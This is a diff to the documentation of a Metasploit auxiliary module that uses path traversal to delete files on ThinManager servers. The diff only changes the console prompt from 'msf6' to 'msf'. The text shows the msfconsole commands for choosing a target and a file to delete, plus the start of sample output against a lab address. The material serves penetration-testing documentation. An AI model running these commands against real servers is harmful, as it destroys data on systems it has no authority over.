@@ -24,10 +24,10 @@ The software can be obtained from
 2. Start `msfconsole` and run the following commands:
 
 ```
-msf6 > use auxiliary/gather/thinmanager_traversal_delete
-msf6 auxiliary(gather/thinmanager_traversal_delete) > set RHOSTS <IP>
-msf6 auxiliary(gather/thinmanager_traversal_delete) > set FILE <file to delete>
-msf6 auxiliary(gather/thinmanager_traversal_delete) > run
+msf > use auxiliary/gather/thinmanager_traversal_delete
+msf auxiliary(gather/thinmanager_traversal_delete) > set RHOSTS <IP>
+msf auxiliary(gather/thinmanager_traversal_delete) > set FILE <file to delete>
+msf auxiliary(gather/thinmanager_traversal_delete) > run
 ```
 
 This should delete the file as specified through FILE from the remote server.
@@ -42,7 +42,7 @@ The file to delete from the remote server.
 Running the exploit against ThinManager v13.0.1 on Windows 22H2 should result in an output similar to the following:
 
 ```
-msf6 auxiliary(gather/thinmanager_traversal_delete) > run
+msf auxiliary(gather/thinmanager_traversal_delete) > run
 [*] Running module against 192.168.137.229
 
 [*] 192.168.137.229:2031 - Running automatic check ("set AutoCheck false" to disable)
